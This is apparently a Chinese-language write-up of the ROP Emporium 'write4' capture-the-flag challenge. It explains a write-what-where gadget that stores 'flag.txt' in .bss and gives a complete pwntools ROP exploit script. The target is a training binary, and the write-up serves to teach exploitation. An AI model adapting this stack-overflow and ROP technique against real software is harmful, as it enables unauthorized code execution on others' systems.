# write4

> ROP Emporium 第 4 题 | x86-64 Linux | 知识点: write-what-where + .bss 利用 + 字节级解析

## 题目简介

32 字节栈溢出。这次要调用 `print_file("flag.txt")`,但程序里**完全不存在** `flag.txt` 字符串(不像 split 题里有现成的)。需要自己"造"一个字符串写进内存,然后把地址传给 print_file。

## 核心知识点

- **write-what-where (WWW) gadget**: `mov qword ptr [r14], r15; ret` —— 把 R15 的 8 字节按小端序写进 R14 指向的内存地址
- **`.bss` 段**: 程序的全局未初始化变量区,默认全 0,**可写**。是放临时字符串的理想位置
- **寄存器组合硬编码**: 程序里有什么 gadget 就用什么,write4 这题恰好是 R14 / R15(其他题可能是 RDI / RSI 或 R13 / R12)
- **8 字节字符串技巧**: x64 寄存器 64 位 = 8 字节,`"flag.txt"` 正好 8 字节,一条 mov 写完。.bss 第 9 字节本来就是 `\0`(C 字符串结束符)

## 二进制侦察

```bash
file ./write4
checksec --file=write4
ldd ./write4
# libwrite4.so 是题目动态库

python3 -c "from pwn import *; print(hex(ELF('./write4').bss()))"
# 0x601038
```

## 漏洞分析

pwnme 同前。

`print_file` 函数定义在 `libwrite4.so` 里:

```c
void print_file(char *filename) {
    FILE *fp = fopen(filename, "r");
    char buf[256];
    fgets(buf, 256, fp);
    puts(buf);
}
```

需要传一个**合法的 C 字符串地址**(NULL 结尾)。

## 攻击思路

### write-what-where 字节级过程

这是 write4 最容易卡壳的地方。完整字节流:

```
栈上:
    +-------------+
    | 0x601038    |  <- 1. pop r14 弹这个进 R14 (R14 = .bss 地址)
    +-------------+
    | "flag.txt"  |  <- 2. pop r15 弹这个进 R15
    +-------------+      pop 按小端序解释 8 字节字符串:
                         R15 字节 = [0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]
                                     'f'   'l'   'a'   'g'   '.'   't'   'x'   't'
                         R15 数值 = 0x7478742e67616c66

执行 mov qword ptr [r14], r15:
    把 R15 的 8 字节按小端序写回内存:
    [0x601038] = 0x66 = 'f'
    [0x601039] = 0x6c = 'l'
    [0x60103a] = 0x61 = 'a'
    [0x60103b] = 0x67 = 'g'
    [0x60103c] = 0x2e = '.'
    [0x60103d] = 0x74 = 't'
    [0x60103e] = 0x78 = 'x'
    [0x60103f] = 0x74 = 't'
    [0x601040] = 0x00 ('\0',.bss 自带)
```

`pop` 和 `mov` 两次小端序操作互相抵消,**结果就是原样把 `b'flag.txt'` 字节写进了内存**。

### ROP 链

```
1. pwnme ret           → pop_r14_r15
2. pop r14             → R14 = 0x601038 (.bss)
3. pop r15             → R15 = "flag.txt"
4. ret                 → mov_r14_r15 gadget
5. mov [r14], r15      → 写入完成
6. ret                 → ret_gadget (对齐补偿)
7. ret_gadget          → pop_rdi
8. pop rdi             → RDI = 0x601038
9. ret                 → print_file@plt
```

## exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = context.binary = ELF('./write4')
io = process('./write4')

pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628

rop = ROP(elf)
pop_rdi    = rop.find_gadget(['pop rdi', 'ret']).address
ret_gadget = rop.find_gadget(['ret']).address

bss        = elf.bss()
print_file = elf.plt['print_file']

payload  = b'A' * 40
payload += p64(pop_r14_r15)
payload += p64(bss)
payload += b'flag.txt'
payload += p64(mov_r14_r15)
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_file)

io.sendline(payload)
io.interactive()
```

## 关键细节

- **Ghidra 地址陷阱**: Ghidra 反编译时显示的 `.bss` 地址可能是 `.so` 文件内偏移(如 `0x00301068`),不是运行时地址。**用 `elf.bss()` 或 `readelf -S` 取权威值**(主程序里通常 `0x601038`)
- **小端序等价记忆**: `b'flag.txt'` 在 payload 里和 `p64(0x7478742e67616c66)` 完全等价。写哪个都行,字节级一致
- **寄存器组合不能选**: write4 是 R14/R15,badchars 是 R12/R13,出题人决定。读 ROPgadget 输出找 `mov qword` 看真实组合,**不要硬套教程模板**

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/write4.html>
